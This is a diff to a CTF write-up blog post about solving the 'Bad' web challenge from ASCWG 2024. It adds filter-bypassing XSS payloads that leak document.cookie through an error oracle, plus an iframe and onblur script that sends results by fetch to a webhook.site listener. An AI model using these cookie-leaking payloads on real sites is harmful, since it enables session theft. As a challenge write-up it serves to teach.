@@ -4,7 +4,7 @@ author: aelmosalamy
 date: 2024-08-03
 tags:
   - ctf
-draft: true
+draft: false
 cover: /images/bad-challenge-cover.png
 ---
 In this writeup, I will explain how I solved Bad, an interesting web challenge written by the amazing *Abdelhamid Ghazy* as part of the recent Arab Security Conference War Games (ASCWG) 2024.
@@ -347,8 +347,62 @@ document.cookie.at`0`.replace`f`.split``.with`8`
 **Error-based character-at-position bypassing filtered characters:**
 We can use the following to leak characters we are unable to write otherwise such as `_`, `{` and `}`.
 ```js
-.at`25`.charCodeAt`0`.toString`10`.replace`107`.split``.with`8`
+document.cookie.at`25`.charCodeAt`0`.toString`10`.replace`107`.split``.with`8`
+```
+
+**Error-based startsWith negative leak:**
+```js
+// slice can be modified to skip filtered chars
+document.cookie.slice`0`.startsWith`flag`.toString``.split``.with`4`
+document.cookie.slice`5`.startsWith`ASCWG`.toString``.split``.with`4`
+document.cookie.slice`11`.startsWith`1`.toString``.split``.with`4`
 ```
 
 The payloads above will throw an error and not trigger `fetch` if true except the last payload `startsWith` which will throw an error only if the condition is false.
 
+The last payload is very interesting because it is the only one that provide a negative affirmation. It will throw an error and call our listener *only* if the flag starts with the provided prefix (This is because `true` is shorter than `false` 😉) which proved to be very valuable since incorrect guesses are more probably than correct ones.
+
+We want a confirmation on every single guess telling us it is wrong. If getting a confirmation is the default, we can easily tell whether the issue is with the bot, network issues, timeout issues or any other potential oddities.
+
+It is also special because it is incrementally self-correcting. For every payload we send, we include information from our previous findings confirming any issues we may have had with previous guesses.
+
+## 4. A Leaky Conclusion
+My method was excruciatingly slow, prone to human error and hard to automate (despite a two-hour failed automation attempt).
+
+Through trial and error, I realized that such asynchronous blind-based attacks require you to provide some indication to tell you which request are you getting the response for, for example, putting a generic `/blurred` route is a very terrible idea:
+```html
+<iframe src="https://bad.ascwg-challs.app/?name='%2bdocument.cookie.split``.with`50`%2bwindow.focus``%2b'"></iframe>
+...
+<script>
+window.onblur = e => {
+  console.log('Focus on iframe')
+  fetch('https://webhook.site/e550ec1f-2266-46ca-b16a-b46a19835a2b/blurred')
+}
+</script>
+```
+
+Instead, you should use a value that is connected to the value that may have triggered the `fetch`, like:
+```html
+<iframe src="https://bad.ascwg-challs.app/?name='%2bdocument.cookie.split``.with`50`%2bwindow.focus``%2b'"></iframe>
+...
+<script>
+window.onblur = e => {
+  console.log('Focus on iframe')
+  fetch('https://webhook.site/e550ec1f-2266-46ca-b16a-b46a19835a2b/with50')
+}
+</script>
+```
+
+This way, any latency or extremely delayed response, either due to network or bot queueing, does not affect your results.
+
+The two extremely wrong flags I got, which took me over eight hours, were due to sending payload `a`, response getting delayed, me thinking it is invalid, then moving on to payloads `b`, `c`, ... `e` before receiving the extremely delayed, generic response of payload `a`.
+
+I would think it is in response to my most recent payload, while in fact, it is reminiscent of a payload I sent 2-3 minutes ago.
+
+Overall, I sent over 800 requests and got two totally garbage flags, before I was able to leak the actual flag.
+
+The last clutch attempt was successful due to two reasons:
+- the more reliable `startsWith` negative confirmation
+- My teammate **0xNEF**, who performed a double-pass with me, confirming every single results before we included it into our final flag
+
+From here, I believe you can assemble the pieces yourself. Hope you learnt something new and see you in the next one 👋
